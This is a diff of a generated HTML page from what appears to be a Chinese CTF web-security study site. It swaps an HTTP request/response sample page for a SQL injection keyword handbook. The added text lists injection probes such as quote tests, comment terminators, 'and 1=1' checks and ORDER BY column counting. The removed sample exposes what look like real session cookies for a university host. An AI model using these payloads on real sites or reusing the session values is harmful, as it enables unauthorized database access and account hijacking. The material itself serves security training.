@@ -12,13 +12,13 @@
         <meta name="author" content="wiles">
       
       
-        <link rel="canonical" href="https://wiles.github.io/ctf-web/http%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94%E6%A0%B7%E4%BE%8B/">
+        <link rel="canonical" href="https://wiles.github.io/ctf-web/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D/">
       
       
-        <link rel="prev" href="../http%E7%8A%B6%E6%80%81%E7%A0%81/">
+        <link rel="prev" href="../Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8%E8%AF%B4%E6%98%8E/">
       
       
-        <link rel="next" href="../%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/">
+        <link rel="next" href="../%E5%9F%BA%E7%A1%80SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E5%A4%A7%E5%85%A8/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -26,7 +26,7 @@
     
     
       
-        <title>HTTP请求与响应样例 - CTF-Web安全学习笔记</title>
+        <title>SQL注入关键词 - CTF-Web安全学习笔记</title>
       
     
     
@@ -79,6 +79,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#sql" class="md-skip">
+          跳转至
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -109,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              HTTP请求与响应样例
+              SQL注入关键词
             
           </span>
         </div>
@@ -269,6 +274,8 @@
   
   
   
+    
+  
   
     
     
@@ -276,10 +283,12 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
+      <li class="md-tabs__item md-tabs__item--active">
         <a href="../MySQL%E6%96%B0%E6%89%8B%E5%BF%85%E5%A4%87%E5%85%B3%E9%94%AE%E8%AF%8D%E6%89%8B%E5%86%8C/" class="md-tabs__link">
           
   
@@ -299,12 +308,10 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
+      <li class="md-tabs__item">
         <a href="../%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/" class="md-tabs__link">
           
   
@@ -823,28 +830,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
-        
-          
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   
@@ -857,7 +867,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             SQL注入
@@ -868,28 +878,31 @@
                 
   
   
+    
   
   
+  
     
     
     
     
       
       
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
         
           
+          
         
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1" >
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
         
           
-          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
             
   
   
@@ -902,7 +915,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3_1">
             <span class="md-nav__icon md-icon"></span>
             基础知识
@@ -959,10 +972,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    SQL注入关键词
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -973,6 +1008,269 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 基础探测关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 基础探测关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1 单引号测试
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2 注释符
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 逻辑测试
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 信息收集关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 信息收集关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 ORDER BY
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-union-select" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 UNION SELECT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-group_concat" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3 GROUP_CONCAT
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 常用函数
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 常用函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 版本信息
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 数据库信息
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3 用户信息
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 绕过过滤技巧
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. 绕过过滤技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1 大小写混合
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2 内联注释
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.3 十六进制编码
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. 盲注关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 盲注关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.1 时间盲注
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.2 布尔盲注
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 文件操作关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. 文件操作关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.1 读取文件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.2 写入文件
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 防御建议
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1022,10 +1320,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -1034,7 +1335,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
         
           
-          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
             
   
   
@@ -1144,10 +1445,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -1156,7 +1460,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
         
           
-          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="">
             
   
   
@@ -1266,10 +1570,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -1278,7 +1585,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_4" >
         
           
-          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="">
             
   
   
@@ -1340,31 +1647,28 @@
       
   
   
-    
   
   
-  
     
     
     
     
-      
-        
-        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
         
           
-          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
             
   
   
@@ -1377,7 +1681,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             Web安全基础
@@ -1457,17 +1761,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../http%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94%E6%A0%B7%E4%BE%8B/" class="md-nav__link">
         
   
   
@@ -1478,7 +1775,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -1658,6 +1954,259 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 基础探测关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 基础探测关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1 单引号测试
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2 注释符
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 逻辑测试
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 信息收集关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 信息收集关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 ORDER BY
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-union-select" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 UNION SELECT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-group_concat" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3 GROUP_CONCAT
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 常用函数
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 常用函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 版本信息
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 数据库信息
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3 用户信息
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 绕过过滤技巧
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. 绕过过滤技巧">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1 大小写混合
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2 内联注释
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.3 十六进制编码
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. 盲注关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 盲注关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.1 时间盲注
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.2 布尔盲注
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 文件操作关键词
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. 文件操作关键词">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.1 读取文件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.2 写入文件
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 防御建议
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -1676,42 +2225,141 @@
   
 
 
-  <h1>HTTP请求与响应样例</h1>
-
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nf">GET</span> <span class="nn">/user/index</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">1906.usst.edu.cn</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">CLIENT_URL=; _ga=GA1.1.2002883381.1730684000; _ga_2R0FQPRD5M=GS1.1.1730707443.3.0.1730707443.0.0.0; iPlanetDirectoryPro=EBOTxPUUTgilO21rjPApOc; session=V2-1-c91188f3-71ec-40dd-9131-69bf59153f47.MTY2NA.1730861025306.Ji_6leAB1YGFSbMMoE-cVKxkehg</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">cross-site</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="na">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="na">Sec-Ch-Ua</span><span class="o">:</span> <span class="l">&quot;Chromium&quot;;v=&quot;130&quot;, &quot;Microsoft Edge&quot;;v=&quot;130&quot;, &quot;Not?A_Brand&quot;;v=&quot;99&quot;</span>
-<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="na">Sec-Ch-Ua-Mobile</span><span class="o">:</span> <span class="l">?0</span>
-<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="na">Sec-Ch-Ua-Platform</span><span class="o">:</span> <span class="l">&quot;Windows&quot;</span>
-<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
-<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en,zh-CN;q=0.9,zh;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
-<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="na">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
+<h1 id="sql">SQL注入关键词手册<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<h2 id="1">1. 基础探测关键词<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
+<h3 id="11">1.1 单引号测试<a class="headerlink" href="#11" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">-- 测试是否存在注入点</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; --+</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span> <span class="m">200</span> <span class="ne">OK</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="na">Server</span><span class="o">:</span> <span class="l">Tengine</span>
-<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Tue, 05 Nov 2024 02:43:45 GMT</span>
-<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=utf-8</span>
-<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="na">Vary</span><span class="o">:</span> <span class="l">Accept-Encoding</span>
-<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="na">Access-Control-Expose-Headers</span><span class="o">:</span> <span class="l">X-SESSION-ID</span>
-<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">session=V2-1-c91188f3-71ec-40dd-9131-69bf59153f47.MTY2NA.1730861025553.yPkTeIfHCD7agsdqRWZiZwPe5Es; Path=/</span>
-<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="na">X-Session-Id</span><span class="o">:</span> <span class="l">V2-1-c91188f3-71ec-40dd-9131-69bf59153f47.MTY2NA.1730861025553.yPkTeIfHCD7agsdqRWZiZwPe5Es</span>
-<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="na">Access-Control-Allow-Headers</span><span class="o">:</span> <span class="l">Authorization,DNT,X-SESSION-ID,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range</span>
-<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="na">Access-Control-Allow-Origin</span><span class="o">:</span> <span class="l">*</span>
-<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="na">X-Content-Type-Options</span><span class="o">:</span> <span class="l">nosniff</span>
-<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="na">X-Frame-Options</span><span class="o">:</span> <span class="l">SAMEORIGIN</span>
-<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
-<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="cp">&lt;!doctype html&gt;</span>
-<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;zh-CN&quot;</span> <span class="na">version</span><span class="o">=</span><span class="s">&quot;1.72.74918-release-377785fd&quot;</span> <span class="na">host</span><span class="o">=</span><span class="s">&quot;https://1906.usst.edu.cn:443/&quot;</span> <span class="na">delivery-org</span><span class="o">=</span><span class="s">&quot;usst&quot;</span><span class="p">&gt;</span>
-<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<h3 id="12">1.2 注释符<a class="headerlink" href="#12" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">-- MySQL注释</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; --+</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="o">#</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1">-- MSSQL注释</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; --</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="s1">-- Oracle注释</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="c1">--</span>
 </code></pre></div>
+<h3 id="13">1.3 逻辑测试<a class="headerlink" href="#13" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">-- 数字型测试</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1">-- 字符型测试</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">2</span>
+</code></pre></div>
+<h2 id="2">2. 信息收集关键词<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
+<h3 id="21-order-by">2.1 ORDER BY<a class="headerlink" href="#21-order-by" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">-- 确定列数</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by 3--+</span>
